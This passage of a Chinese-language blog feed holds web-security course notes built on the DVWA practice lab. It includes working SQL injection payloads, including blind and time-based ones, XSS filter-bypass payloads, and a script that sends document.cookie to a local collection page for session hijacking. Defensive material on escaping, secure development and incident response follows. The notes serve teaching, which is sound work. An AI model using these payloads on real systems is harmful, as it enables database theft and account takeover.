src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570453842458.png" alt="1570453842458"></p><ul><li>1’ or ‘1024’=’1024</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570453915535.png" alt="1570453915535"></p><ul><li>1” or “1024”=”1024</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570453929728.png" alt="1570453929728"></p><h3 id="三种mysql注释符"><a href="#三种mysql注释符" class="headerlink" title="三种mysql注释符"></a>三种mysql注释符</h3><ol><li><code>#</code>（忽略）：单行注释，注意与url中#区分，常编码成<code>%23</code></li><li><code>--  </code>(忽略)：单行注释，注意是<strong>短线短线空格</strong></li><li><code>/*(忽略)*/</code>：多行注释，至少有<strong>两处输入</strong>，/**/注入常用来作为空格</li></ol><p><strong>确定查询字段数</strong></p><ul><li>1’ order by 1– （别忘了空格）</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570454364256.png" alt="1570454364256"></p><ul><li><code>1&#39; order by 10-- </code></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570454498561.png" alt="1570454498561"></p><p><strong>解决方法：二分法</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570454563067.png" alt="1570454563067"></p><p><strong>确定回显点</strong></p><p><code>union select </code></p><p>`1,</p><p><code>2</code></p><p>查询s</p><h3 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h3><p><strong>低等级</strong></p><h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><p>输入1显示——&gt;查询结果：真</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570881049174.png" alt="1570881049174"></p><p>输入：-1——&gt;查询结果：假</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570881110911.png" alt="1570881110911"></p><p>三种注入POC ：<code>真 and 假 = 假</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570881306459.png" alt="1570881306459"></p><p>确定注入POC：</p><ul><li>1 and 1024 = 1025</li><li>1’ and ‘1024’=’1025</li><li>1”and “1024”=”1025</li></ul><p>结果分别是</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570881456454.png" alt="1570881456454"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570881518870.png" alt="1570881518870"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570881531818.png" alt="1570881531818"></p><p><strong>盲注思路</strong></p><p><code>1&#39;and 真 --</code>    为真</p><p><code>1&#39; and 假 --</code>  为假</p><p><strong>SQL函数</strong></p><p>函数1：<code>length(str)</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570886124529.png" alt="1570886124529"></p><p><code>1&#39; and length(database())&gt;1 --</code>结果：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570886415988.png" alt="1570886415988"></p><p><code>1&#39; and length(database())&gt;10 --</code>:结果</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570886467938.png" alt="1570886467938"></p><p>然后使用二分法进行尝试</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570886530887.png" alt="1570886530887"></p><p>函数2 ：<code>substr(expression,start,length)</code> 作用是获取子字符串（原始字符串，子串开始位置，子串长度）</p><p>函数3：ascii(string)作用是获取第一个字符的ASCII数值（字符串）</p><p><strong>确定字符串内容</strong></p><ul><li><p>单字符ASCII码范围：0-127</p></li><li><p><code>1&#39; and ascii(substr(database(),1,1))&gt;64 --</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570893252652.png" alt="1570893252652"></p></li></ul><p><strong>SQL盲注分类</strong></p><ul><li>布尔型</li><li>延时型<ul><li><code>if(expr1,expr2,expr3)</code>:如果expr1为真，返回expr2，否则返回expr3</li></ul></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570893338580.png" alt="1570893338580"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570893371527.png" alt="1570893371527"></p><ul><li>sleep（N）：休眠（N秒）</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570893418853.png" alt="1570893418853"></p><p><code>1&#39; and sleep(if(length(database())=4,5,0))--</code></p><ul><li>benchmark(count,expr):重复计算（次数为count，表达式）</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570893743150.png" alt="1570893743150"></p><p><strong>sqlmap操作：</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570894137940.png" alt="1570894137940"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570894155525.png" alt="1570894155525"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570894180980.png" alt="1570894180980"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570894191648.png" alt="1570894191648"></p><p><strong>sqlmap注入方法</strong></p><ul><li>payload</li><li><code>1&#39; AND ORD(MID((IFNULL(CAST(DATABASE() AS CHAR),0X20))1,1))&gt;64 AND &#39;kqKY&#39;=&#39;kqKY&#39;</code></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570895542200.png" alt="1570895542200"></p><p>SQL函数：<code>cast(expression as data_type)</code>:数据类型转换（表达式as新的数据类型）</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570894423260.png" alt="1570894423260"></p><ul><li><p><code>ifnull(expr1,expr2)</code>:如果expr1是null，返回expr2，否则返回本身</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570894554927.png" alt="1570894554927"></p></li><li><p><code>mid(expression,start,length)</code>：获取子字符串（原始字符串，子串开始位置，子串长度）</p></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570895336523.png" alt="1570895336523"></p><ul><li>order（string）：获取第一个字符的ASCII数值（字符串）</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570895447481.png" alt="1570895447481"></p><h4 id="中等难度"><a href="#中等难度" class="headerlink" title="中等难度"></a>中等难度</h4><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570895593775.png" alt="1570895593775"></p><h4 id="高级"><a href="#高级" class="headerlink" title="高级"></a>高级</h4><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570895649534.png" alt="1570895649534"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570895691525.png" alt="1570895691525"></p><p><strong>演练</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570896157984.png" alt="1570896157984"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570896188427.png" alt="1570896188427"></p><h4 id="impossible等级-1"><a href="#impossible等级-1" class="headerlink" title="impossible等级"></a>impossible等级</h4><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570896521988.png" alt="1570896521988"></p><p>解决</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570896534031.png" alt="1570896534031"></p><h2 id="8-XSS"><a href="#8-XSS" class="headerlink" title="8 XSS"></a>8 XSS</h2><p>三种类型：</p><ul><li>存储型XSS：攻击代码在<strong>数据库</strong>里，输出在<strong>HTTP响应</strong>中</li><li>反射型XSS：攻击代码在<strong>url</strong>里，输出在<strong>HTTP响应</strong>中</li><li>DOM型XSS：攻击代码在<strong>url</strong>里，输出在<strong>DOM节点</strong>中</li></ul><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>输入<code>xss</code>和<code>&lt;xss&gt;</code>，结果分别是</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570931479249.png" alt="1570931479249"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570931495017.png" alt="1570931495017"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570931768767.png" alt="1570931768767"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570931679807.png" alt="1570931679807"></p><p><strong>弹窗测试</strong>：</p><ul><li><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570931841776.png" alt="1570931841776"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932011491.png" alt="1570932011491"></p><p>查看页面元素，成功注入JavaScript脚本</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932085102.png" alt="1570932085102"></p><p>还有其他的JavaScript弹窗函数</p><ul><li><code>confirm()</code></li><li><code>prompt()</code></li></ul><p><strong>攻击思路</strong><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932221155.png" alt="1570932221155"></p><p><strong>攻击者web设计</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932386926.png" alt="1570932386926"></p><p><strong>构造攻击js</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932431640.png" alt="1570932431640"></p><p><strong>构造并发送攻击url</strong></p><p>​    <img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932453395.png" alt="1570932453395"></p><p>上面的url并不能达到要求，此时需要对url进行URLencode才行</p><p><strong>获取cookie</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932544088.png" alt="1570932544088"></p><p><strong>劫持会话</strong></p><ul><li><p>firebug</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932622351.png" alt="1570932622351"></p></li><li><p>cookie编辑</p></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932637695.png" alt="1570932637695"></p><ul><li>index.php</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932605122.png" alt="1570932605122"></p><p><strong>演示：</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932991292.png" alt="1570932991292"></p><ul><li><code>http://127.0.0.1/dvwa-master/vulnerabilities/xss_r/?name=&lt;script&gt;document.location=&#39;http://localhost/cookie.php?cookie&#39;=+document.cookie;&lt;/script&gt;</code></li></ul><p><strong>Medium等级</strong></p><p>之前的方法不行了，因为被过滤了，如下</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570933816599.png" alt="1570933816599"></p><ul><li>方法：嵌套，即<code>&lt;scr&lt;script&gt;ipt&gt;</code>就成了</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570933924058.png" alt="1570933924058"></p><ul><li>方法：大小写混合，因为我们猜测只进行对小写的过滤，事实证明是对的</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570934065746.png" alt="1570934065746"></p><p><strong>High等级</strong></p><p>之前的low和medium都是失效的</p><p>方法：</p><ul><li><p><code>img</code>标签也可嵌入<code>script</code>标签：<code>&lt;img src=x onerror=alert(1)&gt;</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570934302061.png" alt="1570934302061"></p></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570934344019.png" alt="1570934344019"></p><ul><li>iframe标签：可以嵌入另一个HTML内容，<code>&lt;iframe onload=alert(1)&gt;</code></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570934414560.png" alt="1570934414560"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570934461934.png" alt="1570934461934"></p><p><strong>impossible等级（这是一个安全等级）</strong></p><ul><li>&amp;” ‘ &lt;&gt;</li></ul><p>了解一下<code>htmlspecialchars</code>函数</p><ul><li><code>&amp;</code>：<code>&amp;amp;</code></li><li><code>&quot;</code>：<code>&amp;quot;</code></li><li><code>&#39;</code>：<code>&amp;apos;</code>       ——&gt;  <code>ENT_QUOTES参数</code></li><li><code>&lt;</code>：<code>&amp;lt;</code></li><li><code>&gt;</code>：<code>&amp;gt;</code></li></ul><h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p><strong>前端限制</strong>：限制了长度</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570935030935.png" alt="1570935030935"></p><p><strong>方法：使用Tamper Data绕过</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570935234036.png" alt="1570935234036"></p><p>最后成功绕过限制</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570935265788.png" alt="1570935265788"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570935927528.png" alt="1570935927528"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570935953663.png" alt="1570935953663"></p><h2 id="9-SDL"><a href="#9-SDL" class="headerlink" title="9 SDL"></a>9 SDL</h2><p>为什么要用：</p><ul><li>提升web应用的安全性，减少web应用的安全漏洞</li><li>降低安全漏洞修复成本</li></ul><p>SDL是什么：</p><ul><li>Security Development Lifecycle：安全开发生产周期</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570936306322.png" alt="1570936306322"></p><p>SDL流程的组成：</p><ul><li>培训：核心安全培训</li><li>需求：安全需求分析——质量要求/bug数量要求——安全和隐私风险评估</li><li>设计：设计需求分析——减小攻击面</li><li>实施：使用指定工具——弃用不安全函数——静态分析</li><li>验证：动态分析——模糊测试——威胁模型和攻击面评析</li><li>发布：事件响应计划——最终安全评析——发布存档</li><li>响应 </li></ul><h2 id="10-漏洞和事件处理"><a href="#10-漏洞和事件处理" class="headerlink" title="10 漏洞和事件处理"></a>10 漏洞和事件处理</h2><ul><li>安全需求分析：<ul><li>项目初期介入，<strong>提前</strong>发现安全问题</li><li>使用web框架和语言的选型建议</li><li>敏感信息，如密码的保存方案</li><li>是否有上传功能</li><li>……</li></ul></li><li>安全扫描：<ul><li>通过扫描器发现安全问题</li><li>自动化</li><li>周期性执行</li></ul></li><li>安全测试：<ul><li>发现安全问题的<strong>主要方式</strong></li><li>包括白盒和黑盒测试，通常以黑盒测试为主</li></ul></li><li>入侵检测：<ul><li>项目上线之后进行监控</li><li>包含多种检测方式</li><li>通过监控入侵行为发现问题</li></ul></li><li>日志分析：<ul><li>项目上线之后分析日志</li><li>常见模式：可疑日志+人工分析   /    可疑日志+扫描器</li></ul></li><li>建立SRC： <ul><li>安全响应中心：Security  Response  Center</li><li>通过安全爱好者发现安全问题</li></ul></li><li>与漏洞搜集平台合作：<ul><li>借助漏洞平台的力量和影响力</li></ul></li><li>其他渠道：<ul><li>黑产卧底</li><li>和国家执法部门合作</li></ul></li></ul><p><strong>如何处理安全漏洞？</strong></p><ol><li><strong>防御方面</strong></li></ol><ul><li><p>输入检查：</p><ul><li>在服务端检查</li><li>数据合法性校验：类型、范围、长度</li><li>尽可能使用“白名单”</li></ul></li><li><p>输出检查：</p><ul><li>在数据输出的点，也需要做一些特定的过滤和转义</li><li>比如xss，输出到HTML标签时就需要进行HTML编码</li></ul></li><li><p>针对性防御：</p><ul><li>针对特定安全漏洞的利用方式，有特定的防御策略</li><li>比如重要的cookie设置为httponly，这样使用xss就获取不到cookie</li></ul></li><li><p>WAF:</p><ul><li>web Application Firewall：web应用防火墙</li><li>能够拦截攻击，如针对SQL注入、xss和远程代码执行等漏洞进行的攻击</li></ul></li></ul><p>输入检查——输出检查——针对性防御——WAF</p><p>2 <strong>修复</strong></p><ul><li>漏洞知识库：<ul><li>提供详细的漏洞说明和修复方案</li><li>修复方案需要可落地执行：<ul><li>结合公司的开发情况：框架、语言</li><li>包含各种框架、语言的修复方案</li></ul></li></ul></li><li>漏洞修复周期：根据漏洞危害等级限定漏洞修复周期，如严重漏洞需要24小时内修复</li><li>漏洞复查：漏洞修复后需要安全团队复查，业务方和开发不可信</li></ul><p><strong>企业如何处理安全事件？</strong></p><p>安全事件应急响应流程：</p><ul><li>事件确认：由产品方、安全方确认事件的真实性，必要时需要和运维、公关和法务等其他团队共同确认</li><li>事件汇报：</li><li>事件处理：<ul><li>成立安全应急小组</li><li>应急方案确定</li><li>应急方案执行</li><li>事件恢复</li></ul></li><li>归档和复盘：事件处理过程需要详细记录、归档，对事件进行复盘</li></ul><p>安全事件分类：</p><ol><li>入侵事件</li><li>攻击事件</li><li>信息泄露事件</li></ol><p>安全事件分级</p><ol><li>高危</li><li>中危</li><li>低危</li></ol><h2 id="11-安全运营概述"><a href="#11-安全运营概述" class="headerlink" title="11  安全运营概述"></a>11  安全运营概述</h2><p>安全运营有哪些工作？</p><ul><li>发现和修复安全问题</li><li>防御体系建设和快速响应攻击</li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全前后端</title>
      <link href="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/"/>
      <url>/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/</url>
      
        <content type="html"><![CDATA[<ul><li>web安全三个层面：代码层面、架构层面、运维层面</li><li>安全问题：用户身份被盗取、用户密码泄露、用户资料被盗取、网站数据库泄露、其他</li></ul><a id="more"></a><h1 id="1-前端XSS"><a href="#1-前端XSS" class="headerlink" title="1 前端XSS"></a>1 前端XSS</h1><p><strong>环境配置：</strong>这里主要使用的是nodejs</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/1569167191375.png" alt="1569167191375"></p><p>安装一个全局模块，监视我们代码，一旦代码改变就会自动重启，非常方便</p><p><code>nodemon</code>中的<code>mon</code>就是monitor监视，注意需要全局安装，需要一个参数<code>-g</code>。由于下载慢，我们需要一个镜像源<code>--registry=http://registry.npm.taobao.org</code></p><p><code>npm install nodemon -g --registry=http://registry.npm.taobao.org</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/1569168044931.png" alt="1569168044931"></p><p>安装成功后可以直接使用这个模块了</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/1569168164136.png" alt="1569168164136"></p><p>另外还需要安装mysql</p><p>看一下项目结构，其中<code>package.json</code>会包含项目的一些信息</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/1569169127276.png" alt="1569169127276"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/1569169421010.png" alt="1569169421010"></p><ul><li>start：将我们的应用跑起来</li><li>dev：指定开发环境，调用之前的nodemon模块（前面说了其作用）</li><li>devDependencies：依赖的内容</li><li>koa：项目的框架</li><li>koa-pug：模板</li></ul><p><code>server.js</code>中的中间件</p><ol><li>静态文件的服务器，即static目录，可直接被前端访问到</li></ol><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/1569169724390.png" alt="1569169724390"></p><ol start="2"><li><code>bodyParser</code>：当post请求发送过来的时候，我们可以直接从node中获取到用户提交的 数据。否则，我们需要自己去解析body</li><li><code>Pug</code>：模板引擎，它是定义到views目录下的。在views下的pug文件都是用缩进的方式来定义HTML的元素结构，明了的看清层级结构</li><li><code>routes</code>：路由</li><li><code>controlers</code>：主要的业务逻辑</li><li>models：数据库</li></ol><p>安转一下<code>jspm</code>，这是一个包管理工具：<code>npm install --g jspm --registry=http://registry.npm.taobao.org</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/1569170404872.png" alt="1569170404872"></p><p>然后安装<code>前端</code>的依赖：<code>jspm install</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/1569170467498.png" alt="1569170467498"></p><p>最后安装一下<code>后端</code>的依赖:<code>npm install --registry=http://registry.npm.taobao.org</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/1569170588639.png" alt="1569170588639"></p><p>如何将项目跑起来：<code>npm run dev</code>，进入到该项目文件夹下，进行这个命令的执行</p><p>浏览器输入<code>localhost:1521</code></p><ul><li>npm start（）</li><li><code>npm run dev</code></li></ul><h2 id="1-XSS介绍"><a href="#1-XSS介绍" class="headerlink" title="1 XSS介绍"></a>1 XSS介绍</h2><p>跨站脚本攻击：Cross Site Scripting</p><p><strong>原理：</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200430125423527.png" alt="image-20200430125423527"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200430125519205.png" alt="image-20200430125519205"></p><p><strong>xss能干啥？</strong></p><ul><li>获取页面数据</li><li>获取cookies</li><li>劫持前端逻辑</li><li>发送请求</li><li>…………</li><li>偷取网站任意数据</li><li>偷取用户资料</li><li>偷取用户密码和登录态</li><li>欺骗用户</li><li>……….</li></ul><h2 id="2-XSS攻击类型"><a href="#2-XSS攻击类型" class="headerlink" title="2 XSS攻击类型"></a>2 XSS攻击类型</h2><ul><li>反射型：url参数<code>直接注入</code></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200430135433970.png" alt="image-20200430135433970"></p><ul><li>存储型：存储到DB后<code>读取时注入</code></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200430140137849.png" alt="image-20200430140137849"></p><p>此时重新刷新页面，就会出现kttme内容的弹窗<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200430140217015.png" alt="image-20200430140217015"></p><h3 id="xss攻击注入点"><a href="#xss攻击注入点" class="headerlink" title="xss攻击注入点"></a><strong>xss攻击注入点</strong></h3><ul><li><p>HTML节点内容：</p><ul><li><pre><code class="javascript">&lt;div&gt;    #&#123;content&#125;&lt;/div&gt;------------------------------------------------&lt;div&gt;    &lt;script&gt;    &lt;/script&gt;&lt;/div&gt;&lt;!--hexoPostRenderEscape:&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- HTML属性:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  - &amp;#96;&amp;#96;&amp;#96;JavaScript&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;img src&amp;#x3D;&amp;quot;#&amp;#123;image&amp;#125;&amp;quot;&amp;#x2F; &amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;img src&amp;#x3D;&amp;quot;1&amp;quot;  onerror&amp;#x3D;&amp;quot;alert(1)&amp;gt;                #note：   1&amp;quot;  onerror&amp;#x3D;&amp;quot;alert(1)    这些是用户输入的内容&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;:hexoPostRenderEscape--&gt;</code></pre></li></ul></li></ul><ul><li><p>JavaScript代码：</p><ul><li><pre><code>&lt;script&gt;    var data = &quot;#&#123;content&#125;&quot;;    var data = &quot;hello&quot;;alert(1);&quot;&quot;;                # note:        